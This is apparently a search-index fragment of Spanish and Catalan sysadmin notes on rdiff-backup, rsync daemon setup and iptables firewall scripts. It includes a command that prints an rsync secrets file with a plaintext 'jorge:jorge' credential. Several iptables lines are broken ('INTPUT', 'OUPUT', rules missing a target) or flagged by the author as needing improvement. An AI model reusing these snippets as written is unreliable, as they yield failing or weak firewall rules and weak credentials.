** ver versiones Queremos sacar un listado de todas las copias realizadas por lo que ejecutaremos: rdiff-backup -l /directorio/copias Per veure totes les versions disponibles d\u2019un arxiu rdiff-backup --list-increments /mnt/backup/vimet/rdiff/templates/user/doc1.txt Per veure una foto de fa 7 dies de un directori concret rdiff-backup --list-at-time 7D /mnt/backup/vimet/rdiff/templates/user/ Per veure tots els canvis que hi han hagut els darrers 7 dies a un directori concret rdiff-backup --list-changed-since 7D /mnt/backup/vimet/rdiff/templates/user/ changed templates/user deleted templates/user/Plantilla_Fedora.qcow2 new templates/user/Plantilla_definitiva.qcow2 Con \u2013list-changed-since lista todos los ficheros que han cambiado desde una marca de tiempo: rdiff-backup \u2013list-changed-since 5D /backups rdiff-backup \u2013list-changed-since 2011 -12-18T09:14:27+01:00 /backups Con \u2013list-at-time podemos listar todos los ficheros que estuvieron presentes en un determinado backup: rdiff-backup \u2013list-at-time 5D /backups rdiff-backup \u2013list-at-time 2011 -12-18T09:14:27+01:00 /backups Y por \u00faltimo, podemos comparar los cambios existentes entre un backup y un directorio en concreto. Para ello rdiff-backup nos ofrece algunas opci\u00f3nes como \u2013compare y \u2013compare-at-time. La primera para comparar con el \u00faltimo backup y la segunda para comparar con una marca de tiempo determinada: rdiff-backup \u2013compare /webs /backups/webs rdiff-backup \u2013compare-at-time 2011 -12-18T09:14:27+01:00 /webs /backups/webs Restauraciones El siguiente comando restaura el directorio /backups/webs de la copia realizada el 05 Mayo del 2011 en /tmp/webs: rdiff-backup -r 2011 -05-06 /backups/webs /tmp/webs La misma recuperaci\u00f3n anterior pero desde un servidor remoto: rdiff-backup -r 2011 -05-06 usuario@servidor::/backups/webs /tmp/webs Recuperaci\u00f3n de una copia de hace 5 d\u00edas: rdiff-backup -r 5D /backups/webs /tmp/webs Vamos a utilizar la marca de tiempo obtenido de un listado queriendo recuperar /backups/webs en /tmp/webs del d\u00eda 20 Diciembre del 2011 a las 23 horas, 00 minutos 01 segundos: rdiff-backup -r 2011 -12-20T23:00:01+01:00 /backups/webs /tmp/webs Si quisi\u00e9ramos recuperarlo de un servidor ejecutar\u00edamos: rdiff-backup -r 2011 -12-20T23:00:01+01:00 usuario@servidor::/backups/webs /tmp/webs","title":"rdiff-backup"},{"location":"seguridad/backups/rdiff-backup/#rdiff-backup","text":"https://www.merkasys.com/rdiff-backup-como-hacer-copias-de-seguridad/","title":"rdiff-backup"},{"location":"seguridad/backups/rdiff-backup/#backup-en-cron","text":"/etc/crontab # Fem el backup incremental a nivell de blocs 25 23 * * * root /usr/bin/rdiff-backup /opt/vimet /mnt/backup/vimet/rdiff > /tmp/rdiff.log 2 > & 1 # Elimina els backups m\u00e9s antics de dues setmanes 45 22 * * * root /usr/bin/rdiff-backup --remove-older-than 2W /mnt/backup/vimet/rdiff","title":"backup en cron"},{"location":"seguridad/backups/rdiff-backup/#crear-backup","text":"backup local rdiff-backup /opt/vimet /mnt/backup/vimet/rdiff > /tmp/rdiff.log a servidor externo rdiff-backup /home/webs copias@osiris::/backups/webs Para hacer una copia entre dos servidores: rdiff-backup usuario1@servidor1::/home/webs usuario2@servidor2::/backups/webs El siguiente comando copiar\u00e1 por ejemplo /usr/local/bin pero no /usr/bin rdiff-backup \u2013include /usr/local \u2013exclude /usr / /backups Ahora queremos copiar todo el sistema excluyendo /proc, /sys, /tmp y /backups: rdiff-backup \u2013exclude /proc \u2013exclude /sys \u2013exclude /tmp \u2013exclude /backups / /backups Notas: Si elegimos copiar todo el sistema agregar siempre un \u2013exclude con el directorio donde se van a realizar las copias. Utilizando \u201cextended shell globbing patterns\u201d . Adem\u00e1s de los directorios que se excluyen del ejemplo anterior, excluiremos todos los ficheros que terminen en jpg: rdiff-backup \u2013exclude /proc \u2013exclude /sys \u2013exclude /tmp \u2013exclude \u2018**jpg\u2019 \u2013exclude /backups / /backups Las comillas simples en los ** son muy importantes para que no los interprete la shell. rdiff-backup tambi\u00e9n nos da la posibilidad de escribir en un fichero lo que queremos copiar. Para ello necesitamos usar la opci\u00f3n \u2013include-list . Hay que escribir una l\u00ednea por fichero/directorio. Si el fichero contiene las l\u00edneas: /etc /home Entonces tendremos que ejecutar: rdiff-backup \u2013include-filelist fichero-list.txt \u2013exclude \u2018**\u2019 / /backups Importante agregar el exclude \u2018 \u2019 para que solo copie lo que hemos indicado en el fichero y excluya el resto. Recordemos que el directorio de origen que indicamos es /. Con la opci\u00f3n \u2013include-globbing-filelist nos permite indicar un fichero donde podemos escribir patrones. Debemos a\u00f1adir una l\u00ednea por patr\u00f3n pudiendo utilizar el car\u00e1cter + para indicar las inclusiones y el car\u00e1cter \u2013 para las exclusiones. - **jpg \u2013 /home/*/Trash + /etc + /home \u2013 ** Con esta configuraci\u00f3n exclu\u00edmos los ficheros que terminen en jpg y la carpeta Trash de todas las carpetas de /home e incluiremos /etc y /home. Para utilizar este fichero ejecutaremos: rdiff-backup \u2013include-globbing-filelist fichero-list.txt / /backups Se utiliza la opci\u00f3n \u2013include-globbing-filelist y no \u2013include-filelist para que reconozca los patrones. Si us\u00e1ramos \u2013include-filelist entender\u00eda los * como propios del nombre del fichero. Antes de terminar este apartado quiero comentar que con la opci\u00f3n \u2013include-globbing-filelist se pueden mezclar l\u00edneas con patrones o sin ellos y l\u00edneas con exclusiones o sin ellas. Es decir, sin los caracteres + o -: -**jpg \u2013 /home/*/Trash \u2013 /usr/local/games /usr/local + /etc + /home \u2013 **","title":"crear backup"},{"location":"seguridad/backups/rdiff-backup/#ver-versiones","text":"Queremos sacar un listado de todas las copias realizadas por lo que ejecutaremos: rdiff-backup -l /directorio/copias Per veure totes les versions disponibles d\u2019un arxiu rdiff-backup --list-increments /mnt/backup/vimet/rdiff/templates/user/doc1.txt Per veure una foto de fa 7 dies de un directori concret rdiff-backup --list-at-time 7D /mnt/backup/vimet/rdiff/templates/user/ Per veure tots els canvis que hi han hagut els darrers 7 dies a un directori concret rdiff-backup --list-changed-since 7D /mnt/backup/vimet/rdiff/templates/user/ changed templates/user deleted templates/user/Plantilla_Fedora.qcow2 new templates/user/Plantilla_definitiva.qcow2 Con \u2013list-changed-since lista todos los ficheros que han cambiado desde una marca de tiempo: rdiff-backup \u2013list-changed-since 5D /backups rdiff-backup \u2013list-changed-since 2011 -12-18T09:14:27+01:00 /backups Con \u2013list-at-time podemos listar todos los ficheros que estuvieron presentes en un determinado backup: rdiff-backup \u2013list-at-time 5D /backups rdiff-backup \u2013list-at-time 2011 -12-18T09:14:27+01:00 /backups Y por \u00faltimo, podemos comparar los cambios existentes entre un backup y un directorio en concreto. Para ello rdiff-backup nos ofrece algunas opci\u00f3nes como \u2013compare y \u2013compare-at-time. La primera para comparar con el \u00faltimo backup y la segunda para comparar con una marca de tiempo determinada: rdiff-backup \u2013compare /webs /backups/webs rdiff-backup \u2013compare-at-time 2011 -12-18T09:14:27+01:00 /webs /backups/webs","title":"ver versiones"},{"location":"seguridad/backups/rdiff-backup/#restauraciones","text":"El siguiente comando restaura el directorio /backups/webs de la copia realizada el 05 Mayo del 2011 en /tmp/webs: rdiff-backup -r 2011 -05-06 /backups/webs /tmp/webs La misma recuperaci\u00f3n anterior pero desde un servidor remoto: rdiff-backup -r 2011 -05-06 usuario@servidor::/backups/webs /tmp/webs Recuperaci\u00f3n de una copia de hace 5 d\u00edas: rdiff-backup -r 5D /backups/webs /tmp/webs Vamos a utilizar la marca de tiempo obtenido de un listado queriendo recuperar /backups/webs en /tmp/webs del d\u00eda 20 Diciembre del 2011 a las 23 horas, 00 minutos 01 segundos: rdiff-backup -r 2011 -12-20T23:00:01+01:00 /backups/webs /tmp/webs Si quisi\u00e9ramos recuperarlo de un servidor ejecutar\u00edamos: rdiff-backup -r 2011 -12-20T23:00:01+01:00 usuario@servidor::/backups/webs /tmp/webs","title":"Restauraciones"},{"location":"seguridad/backups/rsync/","text":"rsync Sincroniza, contenido/mirroring. Tiene dos modos de uso, modo copi sincroniza contenido de directorio a directorio y modo samba que se enciende como servidor y tiene recursos, igual que samba. rsync se puede utilizar de: local - local local - remoto remoto - local Manuales man rsync man rsyncd.conf modo copi Es el m\u00e9todo est\u00e1ndar, se utiliza similar al scp . rsync -a m04-lm /tmp/proves/ # copia el directorio rsync -a m04-lm/ /tmp/proves/ # copia el contenido del directorio rsync -a m04-lm/ localhost:/tmp/proves/ # remoto rsync -av m04-lm/ localhost:/tmp/proves/ # visualizar cambios -n --dry-run # acer test rsync -a ~/dir1 username@remote_host:destination_directory rsync -a --delete m04-lm/ /tmp/proves/ # sincronizar borrando si hay cambios modo samba Como servidor se definen los recursos en /etc/rsyncd.conf y en caso de querer a\u00f1adir usuarios /etc/rsyncd.secrets Usuarios que podr\u00e1n conectar al recurso de usuarios. [ isx47787241@i09 repositorios ] $ sudo cat /etc/rsyncd.secrets jorge:jorge [ isx47787241@i09 repositorios ] $ ll /etc/rsyncd.secrets -rw-------. 1 root root 12 dic 16 09 :50 /etc/rsyncd.secrets Importante: los permisos del fichero /etc/rsyncd.secrets han de ser 0600. Ejemplo de fichero de configuraci\u00f3n, con: public: solo permite descargas. read: solo permite descargas igual que public. privat: permite descargas y subidas desde el usuario jorge. write: solo permite subidas y no puede verse su contenido. [ isx47787241@i09 repositorios ] $ cat /etc/rsyncd.conf log file = /var/log/rsync.log pid file = /var/run/rsyncd.pid [ public ] comment = recurso publico path = /home/debian/rsync/public [ read ] comment = recurso solo lectura path = /home/debian/rsync/read read only = yes [ privat ] comment = recurso de escritura path = /home/debian/rsync/privat list = no read only = no write only = no auth users = jorge secrets file = /etc/rsyncd.secrets [ write ] comment = recurso de escritura path = /home/debian/rsync/write read only = no write only = yes write only regla que determina la descarga, si es verdadero la descarga fallara, si es falso, se podan descargar si el sistema lo permite,( por defecto es no). read only si es verdadero las subidas fallaran , si es falso se podr\u00e1n hacer subidas si el sistema lo permite, (por defecto es yes). demonio sudo rsync --daemon # arrancar servicio sudo killall rsync # detenr servicio conexi\u00f3n rsync localhost:: # listar recursos rsync localhost::public # listar contenido de public rsync -a file localhost::write # subir contenido rsync -a localhost::public . # descargar contenido","title":"rsync"},{"location":"seguridad/backups/rsync/#rsync","text":"Sincroniza, contenido/mirroring. Tiene dos modos de uso, modo copi sincroniza contenido de directorio a directorio y modo samba que se enciende como servidor y tiene recursos, igual que samba. rsync se puede utilizar de: local - local local - remoto remoto - local Manuales man rsync man rsyncd.conf","title":"rsync"},{"location":"seguridad/backups/rsync/#modo-copi","text":"Es el m\u00e9todo est\u00e1ndar, se utiliza similar al scp . rsync -a m04-lm /tmp/proves/ # copia el directorio rsync -a m04-lm/ /tmp/proves/ # copia el contenido del directorio rsync -a m04-lm/ localhost:/tmp/proves/ # remoto rsync -av m04-lm/ localhost:/tmp/proves/ # visualizar cambios -n --dry-run # acer test rsync -a ~/dir1 username@remote_host:destination_directory rsync -a --delete m04-lm/ /tmp/proves/ # sincronizar borrando si hay cambios","title":"modo copi"},{"location":"seguridad/backups/rsync/#modo-samba","text":"Como servidor se definen los recursos en /etc/rsyncd.conf y en caso de querer a\u00f1adir usuarios /etc/rsyncd.secrets Usuarios que podr\u00e1n conectar al recurso de usuarios. [ isx47787241@i09 repositorios ] $ sudo cat /etc/rsyncd.secrets jorge:jorge [ isx47787241@i09 repositorios ] $ ll /etc/rsyncd.secrets -rw-------. 1 root root 12 dic 16 09 :50 /etc/rsyncd.secrets Importante: los permisos del fichero /etc/rsyncd.secrets han de ser 0600. Ejemplo de fichero de configuraci\u00f3n, con: public: solo permite descargas. read: solo permite descargas igual que public. privat: permite descargas y subidas desde el usuario jorge. write: solo permite subidas y no puede verse su contenido. [ isx47787241@i09 repositorios ] $ cat /etc/rsyncd.conf log file = /var/log/rsync.log pid file = /var/run/rsyncd.pid [ public ] comment = recurso publico path = /home/debian/rsync/public [ read ] comment = recurso solo lectura path = /home/debian/rsync/read read only = yes [ privat ] comment = recurso de escritura path = /home/debian/rsync/privat list = no read only = no write only = no auth users = jorge secrets file = /etc/rsyncd.secrets [ write ] comment = recurso de escritura path = /home/debian/rsync/write read only = no write only = yes write only regla que determina la descarga, si es verdadero la descarga fallara, si es falso, se podan descargar si el sistema lo permite,( por defecto es no). read only si es verdadero las subidas fallaran , si es falso se podr\u00e1n hacer subidas si el sistema lo permite, (por defecto es yes).","title":"modo samba"},{"location":"seguridad/backups/rsync/#demonio","text":"sudo rsync --daemon # arrancar servicio sudo killall rsync # detenr servicio","title":"demonio"},{"location":"seguridad/backups/rsync/#conexion","text":"rsync localhost:: # listar recursos rsync localhost::public # listar contenido de public rsync -a file localhost::write # subir contenido rsync -a localhost::public . # descargar contenido","title":"conexi\u00f3n"},{"location":"seguridad/cortafuegos/Iptables/","text":"Iptables Reglas y Acciones Las reglas se eval\u00faan una a una secuencial mente en orden descendente, si una orden coincide con otra hace match, se aplica la primera, es decir si hay una regla que abre el puerto 5000 para la ip 1 y mas abajo hay otra regla que cierra el puerto 5000 para la ip 1, la segunda nunca se aplicara. Activar host hacer router echo 1 > /proc/sys/net/ipv4/ip_forward Borrar reglas actuales sudo iptables -F sudo iptables -X sudo iptables -Z sudo iptables -t nat -F Borrar una regla # Primer les mostrem amb n\u00ba de l\u00ednia iptables -t filter -n -L -v --line-numbers iptables -t nat -n -L -v --line-numbers iptables -t mangle -n -L -v --line-numbers # Esborrar la 4 iptables -D INPUT 4 Politica por defecto Existen dos pol\u00edticas por defecto ACCEPT y DROP, generalmente se establece en el inicio de los scripts cual sera su pol\u00edtica, aceptar todo por defecto o denegar todo por defecto. Accept En la pol\u00edtica Accept todo esta permitido excepto lo que expl\u00edcitamente se deniegue, en este caso las reglas de firewall son una lista de lo que est\u00e1 prohibido. Esta pol\u00edtica es la mas f\u00e1cil de configurar pero el firewall nunca ser\u00e1 del todo seguro. sudo iptables -P INPUT ACCEPT sudo iptables -P OUTPUT ACCEPT sudo iptables -P FORWARD ACCEPT sudo iptables -t nat -P PREROUTING ACCEPT sudo iptables -t nat -P POSTROUTING ACCEPT Drop Esta es la pol\u00edtica mas dif\u00edcil de configurar pero es mas segura, por que por defecto todo esta denegado y se han de asignar en las reglas del firewall todo lo que se permita, asegur\u00e1ndote no olvidarte ninguna opci\u00f3n imprescindible. sudo iptables -P INPUT DROP sudo iptables -P OUTPUT DROP sudo iptables -P FORWARD DROP sudo iptables -t nat -P PREROUTING DROP sudo iptables -t nat -P POSTROUTING DROP Uno de los errores que pueden ocurrir si las reglas no se han asignado bien, es que el sistema se quede bloqueado por haber cerrado demasiados servicios necesarios para el funcionamiento. toda comunicaci\u00f3n de red tiene dos sentidos. hace falta permitir los dos sentidos para considerar accesible un servicio. el trafico de respuesta se puede identificar con modificadores tipo related, established. el trafico necesario para el sistema a de estar abierto dns, sincronizaci\u00f3n horaria, pings, Ldap, Kerberos, NFS, samba, sg\u00fan de que dependa la m\u00e1quina para su funcionamiento. Permitir todo v\u00eda localhost sudo iptables -A INPUT -i lo -j ACCEPT sudo iptables -A OUTPUT -o lo -j ACCEPT -i input-interface, -o output-interface Permitir todo en propia ip sudo iptables -A INPUT -s 192 .168.88.2 -j ACCEPT sudo iptables -A OUTPUT -d 192 .168.88.2 -j ACCEPT -s source(origen) -d destination Permitir una ip/red a puerto # permitir acceder una red a un puerto sudo iptables -A INPUT -s 192 .168.88.0/24 -p tcp --dport 5432 -j ACCEPT # permitir una ip a un rango de puertos sudo iptables -A INPUT -s 80 .37.45.194 -p tcp --dport 20 :21 -j ACCEPT # permitir una ip a un puerto sudo iptables -A INPUT -s 80 .37.45.194 -p tcp --dport 80 -j ACCEPT Cerrar puerto al exterior sudo iptables -A INPUT -p tcp --dport 20 :21 -j DROP sudo iptables -A INPUT -p tcp --dport 5432 -j DROP sudo iptables -A INPUT -p tcp --dport 80 -j DROP Guardar reglas actuales sudo iptables-save > /etc/sysconfig/iptables Backup sudo iptables-save > arxiu.regles.iptables # exportar sudo iptables-restore < arxiu.regles.iptables # inportar sourceport En este ejemplo quiero que el host pueda navegar por internet, pero este mismo host tiene un servidor web y quiero que desde el exterior puedan acceder, por lo tanto a\u00f1ado la regla de aceptar entrada por source port (esto solo es estrictamente necesario en la pol\u00edtica drop). sudo iptables -A INPUT -p tcp -m tcp --sport 80 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT sudo iptables -A INPUT -p tcp -m tcp --sport 443 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 80 -j DROP sudo iptables -A INPUT -p tcp --dport 443 -j DROP ESTABLECIDO significa que el paquete est\u00e1 asociado con una conexi\u00f3n que ha visto paquetes en ambos direcciones NUEVO que significa que el paquete ha comenzado una nueva conexi\u00f3n, o asociado con una conexi\u00f3n que no ha visto paquetes en ambas direcciones, RELACIONADO que significa que el paquete est\u00e1 iniciando una nueva conexi\u00f3n, pero est\u00e1 asociado con una conexi\u00f3n existente, como una transferencia de datos FTP o un ICMP En este caso el ejemplo es de un host/firewall con pol\u00edtica DROP que almacena un servidor web pero no tiene acceso de salida a internet, es decir el servidor web no puede hacer nuevas peticiones por http/s, pero si le permitimos que mande respuestas a las peticiones que le llegan. iptables -A INTPUT -p tcp -m tcp --dport 80 -j ACCEPT iptables -A OUTPUT -p tcp -m tcp --sport 80 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT iptables -A INTPUT -p tcp -m tcp --dport 443 -j ACCEPT iptables -A OUTPUT -p tcp -m tcp --sport 443 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT iptables -A OUTPUT -p tcp --dport 443 -j DROP iptables -A OUTPUT -p tcp --dport 80 -j DROP Permitir trafico establecido iptables -t filter -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -t filter -A OUPUT -m state --state ESTABLISHED,RELATED -j ACCEPT Servicios en drop # Permetre consultes DNS (primari i secundari) /sbin/iptables -A INPUT -s 80 .58.61.250 -p udp --sport 53 -j ACCEPT /sbin/iptables -A OUTPUT -d 80 .58.61.250 -p udp --dport 53 -j ACCEPT /sbin/iptables -A INPUT -s 80 .58.61.254 -p udp --sport 53 -j ACCEPT /sbin/iptables -A OUTPUT -d 80 .58.61.254 -p udp --dport 53 -j ACCEPT # Actuar de servidor web el host/firewall /sbin/iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT /sbin/iptables -A OUTPUT -p tcp -m tcp --sport 80 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT # Permetre al host/firewall navegar per internet /sbin/iptables -A INPUT -p tcp -m tcp --sport 80 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT /sbin/iptables -A OUTPUT -p tcp -m tcp --dport 80 -j ACCEPT /sbin/iptables -A INPUT -p tcp -m tcp --sport 443 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT /sbin/iptables -A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT # Consultar al servidor de temps per permetre la sincronitzaci\u00f3 hor\u00e0ria /sbin/iptables -A INPUT -p udp -m udp --dport 123 -j ACCEPT /sbin/iptables -A OUTPUT -p udp -m udp --sport 123 -j ACCEPT # Permetre el tr\u00e0fic SMTP d\u2019entrada i sortida iptables -A INPUT -s 0 .0.0.0/0 -p tcp --dport 25 -j ACCEPT iptables -A OUTPUT -s 0 .0.0.0/0 -p tcp --dport 25 -j ACCEPT # Servei FTP actiu i passiu /sbin/iptables -A INPUT -p tcp -m tcp --sport 20 :21 -m state \\ --state RELATED,ESTABLISHED -j ACCEPT /sbin/iptables -A OUTPUT -p tcp -m tcp --dport 20 :21 -j ACCEPT # puertos no sistema /sbin/iptables -A INPUT -p tcp -m tcp --sport 1024 :65535 --dport 1024 :65535 -m state \\ --state ESTABLISHED -j ACCEPT /sbin/iptables -A OUTPUT -p tcp -m tcp --dport 1024 :65535 -m state \\ --state NEW,RELATED,ESTABLISHED -j ACCEPT En ocasiones la pol\u00edtica drop hace demasiado bien su trabajo y al abrir nuevos servicios, fallan por que les esta cortando el firewall y se pone en pol\u00edtica accept temporalmente mientras se soluciona el script por prisas o etc.. por esto mismo es una buena practica al final del script poner la barrera drop y as\u00ed no exponer datos sensibles que podamos tener.. # Barrera final DROP per si es canvia a ACCEPT temporalment # tancar tr\u00e0fic no desitjat /sbin/iptables -A INPUT -p tcp -m tcp --dport 1 :1024 -j DROP /sbin/iptables -A INPUT -p udp -m udp --dport 1 :1024 -j DROP /sbin/iptables -A INPUT -p tcp -m tcp --dport 1723 -j DROP /sbin/iptables -A INPUT -p tcp -m tcp --dport 3306 -j DROP /sbin/iptables -A INPUT -p tcp -m tcp --dport 5432 -j DROP Forwarding $ echo 1 > /proc/sys/net/ipv4/ip_forward # o be: sysctl net.ipv4.ip_forward = 1 sysctl -a | grep ip_forward net.ipv4.ip_forward = 1 En un firewall por defecto la red externa suele tener todos los puertos cerrados y la interna abiertos, eth0 interficie externa, eth1 interficie interna. iptables -A INPUT -s 0 .0.0.0 -i eth0 -j DROP iptables -A INPUT -s 172 .16.10.0/24 -i eth1 -j ACCEPT Nat Network Addres Translation se le aplica cuando en un router o host/firewall con dos o mas interficies, recibe peticiones por un red y las devuelve por otra con una ip diferente, en este proceso se a aplicado un forward a recibido un paquete por una red, a mirado de quien era y se lo a enviado estando en una red diferente el destinatario. # NAT usant la IP p\u00fablica de eth0 iptables -t nat -A POSTROUTING -s 172 .16.10.0/24 -o eth0 -j MASQUERADE Forward # no deixar sortir de la lan a exterior a serveis concrets iptables -A FORWARD -s 172 .16.100.0/24 -p tcp --dport 7 -j REJECT iptables -A FORWARD -s 172 .16.100.11 -p tcp --dport 13 -j REJECT # no deixar sortir de la lan a exterior segons dest\u00ed iptables -A FORWARD -s 172 .16.100.0/24 -d 192 .168.1.34 -p tcp --dport 23 -j REJECT iptables -A FORWARD -i em1 -d 192 .168.1.0/24 -p tcp --dport 82 -j REJECT # un host de la lan concret no pot accedir a un servei extern (segons dest\u00ed) iptables -A FORWARD -s 172 .16.100.11 -d 192 .168.1.34 -p tcp --dport 110 -j REJECT iptables -A FORWARD -s 172 .16.100.11 -d 192 .168.1.0/24 -p tcp --dport 143 -j REJECT # evitar que des de dins de la LAN es falsifiqui ip origen (spoofing) iptables -A FORWARD ! -s 172 .16.100.0/24 -i em1 -j REJECT Dnat Destination network address translation es muy similar a NAT pero en DNAT se redirige el puerto a otro diferente, igual que NAT tambi\u00e9n se puede redirigir el destino. Es decir en NAT redirigimos de ip a ip y en DNAT de ip:puerto a ip:puerto . # dirigir tot el tr\u00e0fic http port 80 a un altre host de la LAN iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to 192 .168.10.12:80 iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j DNAT --to 192 .168.10.12:443 # si el tr\u00e0fic hhtp prov\u00e9 de de casa meva (221.15.15.15) enviar-lo a un altre web server # (aquesta regla ha d\u2019anar abans de les anteriors) iptables -t nat -A PREROUTING -s 221 .15.15.15 -i eth0 -p tcp --dport 80 -j DNAT \\ --to 192 .168.10.10:80 iptables -t nat -A PREROUTING -s 221 .15.15.15 -i eth0 -p tcp --dport 443 -j DNAT \\ --to 192 .168.10.10:443 # obrir puerto 2022 e la interfaz enp3s0 y redirigir a 192.168.10.10:22 iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 2022 -j DNAT --to 192 .168.10.10:22 # port forwarding seg\u00fan la red de origen iptables -t nat -A PREROUTING -s 172 .17.0.0/24 -i eth0 -p tcp --dport 2022 -j DNAT --to 192 .168.10.10:22 Icmp iptables -A FORWARD -p icmp --icmp-type 8 -j DROP # habilitar ping iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT # no aceptar ping iptables -A INPUT -p ICMP -j DROP # o iptables -A INPUT -p icmp --icmp-type 8 -j DROP iptables -A OUTPUT -p icmp --icmp-type 8 -j DROP echo-reply (pong) echo-request (ping) => Zero (0) is for echo-reply => Eight (8) is for echo-request. Ejemplo Drop # Regles Flush: buidar les regles actuals iptables -F iptables -X iptables -Z iptables -t nat -F # Establir la politica per defecte (ACCEPT o DROP) iptables -P INPUT DROP iptables -P OUTPUT DROP iptables -P FORWARD DROP # Permetre totes les pr\u00f2pies connexions via localhost iptables -A INPUT -i lo -j ACCEPT iptables -A OUTPUT -o lo -j ACCEPT # Permetre tot el trafic de la pr\u00f2pia ip(192.168.1.49)) iptables -A INPUT -s 192 .168.1.35 -j ACCEPT iptables -A OUTPUT -d 192 .168.1.35 -j ACCEPT #exit 0 # ----------------------------------------------------------- # consulta dns primari iptables -A INPUT -s 80 .58.61.250 -p udp -m udp --sport 53 -j ACCEPT iptables -A OUTPUT -d 80 .58.61.250 -p udp -m udp --dport 53 -j ACCEPT # consulta dns secundari iptables -A INPUT -s 80 .58.61.254 -p udp -m udp --sport 53 -j ACCEPT iptables -A OUTPUT -d 80 .58.61.254 -p udp -m udp --dport 53 -j ACCEPT # consulta ntp iptables -A INPUT -p udp -m udp --dport 123 -j ACCEPT iptables -A OUTPUT -p udp -m udp --sport 123 -j ACCEPT # ---------------------------------------------------------- # servei cups iptables -A INPUT -p tcp --dport 631 -j ACCEPT iptables -A OUTPUT -p tcp --sport 631 -j ACCEPT # port xinetd iptables -A INPUT -p tcp --dport 3411 -j ACCEPT iptables -A OUTPUT -p tcp --sport 3411 -j ACCEPT # port x11-x-forwarding iptables -A INPUT -p tcp --dport 6010 -j ACCEPT iptables -A OUTPUT -p tcp --sport 6010 -j ACCEPT # servei rpc iptables -A INPUT -p tcp --dport 111 -j ACCEPT iptables -A OUTPUT -p tcp --sport 111 -j ACCEPT # ----------------------------------------------------------- # icmp iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT # ----------------------------------------------------------- # servei ssh iptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT # servei http iptables -A INPUT -p tcp --dport 80 -j ACCEPT iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT # servei daytime iptables -A INPUT -p tcp --dport 13 -j ACCEPT iptables -A OUTPUT -p tcp --sport 13 -j ACCEPT # servei echo iptables -A INPUT -p tcp --dport 7 -j ACCEPT iptables -A OUTPUT -p tcp --sport 7 -j ACCEPT # servei smtp iptables -A INPUT -p tcp --dport 25 -j ACCEPT iptables -A OUTPUT -p tcp --sport 25 -j ACCEPT # exit 0 # ============================================================== # atencio: cal millorar aquestes regles!!! ***** # cal que nomes es permeti trafic relacionat ***** # ============================================================== # navegar web #iptables -A INPUT -p tcp --sport 80 -j ACCEPT iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT iptables -A INPUT -p tcp --sport 443 -j ACCEPT iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT # accedir a servei echo #iptables -A INPUT -p tcp --sport 7 -j ACCEPT iptables -A OUTPUT -p tcp --dport 7 -j ACCEPT # accedir al servei daytime #iptables -A INPUT -p tcp --sport 13 -j ACCEPT iptables -A OUTPUT -p tcp --dport 13 -j ACCEPT # accedir al servei ssh #iptables -A INPUT -p tcp --sport 22 -j ACCEPT iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT iptables -A INPUT -m state --state ESTABLISHED,RELATED iptables -A OUTPUT -m state --state ESTABLISHED,RELATED # ----------------------------------------------------------------- # ftp i tftp (trafic udp) ***** # ----------------------------------------------------------------- # oferir servei tftp iptables -A INPUT -p udp --dport 69 -j ACCEPT iptables -A OUTPUT -p udp --sport 69 -j ACCEPT # accedir a serveis tftp externs iptables -A INPUT -p udp --sport 69 -j ACCEPT iptables -A OUTPUT -p udp --dport 69 -j ACCEPT # pendent obrir ports dinamics # oferir servei ftp iptables -A INPUT -p tcp --dport 20 :21 -j ACCEPT iptables -A OUTPUT -p tcp --sport 20 :21 -j ACCEPT # accdir a serveis ftp externs iptables -A INPUT -p tcp --sport 20 :21 -j ACCEPT iptables -A OUTPUT -p tcp --dport 20 :21 -j ACCEPT # pendent obrir ports dinamics! # -------------------------------------------------------------- # Barrera per tancar els serveis/ports en cas de passar a drop # ... Ejemplo DMZ # Activar si el host ha de fer de router echo 1 > /proc/sys/net/ipv4/ip_forward # Regles Flush: buidar les regles actuals iptables -F iptables -X iptables -Z iptables -t nat -F # Establir la politica per defecte (ACCEPT o DROP) iptables -P INPUT ACCEPT iptables -P OUTPUT ACCEPT iptables -P FORWARD ACCEPT iptables -t nat -P PREROUTING ACCEPT iptables -t nat -P POSTROUTING ACCEPT # Permetre totes les pr\u00f2pies connexions via localhost iptables -A INPUT -i lo -j ACCEPT iptables -A OUTPUT -o lo -j ACCEPT # Permetre tot el trafic de la propia ip exterior (wlan0:192.168.1.41)) iptables -A INPUT -s 192 .168.1.41 -j ACCEPT iptables -A OUTPUT -d 192 .168.1.41 -j ACCEPT # Permetre tot el trafic de la propia ip interior (em1:172.16.100.1)) iptables -A INPUT -s 172 .16.100.1 -j ACCEPT iptables -A OUTPUT -d 172 .16.100.1 -j ACCEPT # Permetre tot el trafic de la propia ip interior (em1:172.32.1.1)) iptables -A INPUT -s 172 .32.1.1 -j ACCEPT iptables -A OUTPUT -d 172 .32.1.1 -j ACCEPT #exit 0 # Ahora hacemos enmascaramiento de la red local (HACIA FUERA) iptables -t nat -A POSTROUTING -s 172 .16.100.0/24 -o wlan0 -j MASQUERADE iptables -t nat -A POSTROUTING -s 172 .32.1.0/24 -o wlan0 -j MASQUERADE #exit 0 # ========================================================== # Regles de: xarxa_local-(R/F)-xarxa_externa # # LOCAL_LAN ---(em1)Router/Firewall(wlan0)-- PUBLIC_LAN # | # DMZ (em1) 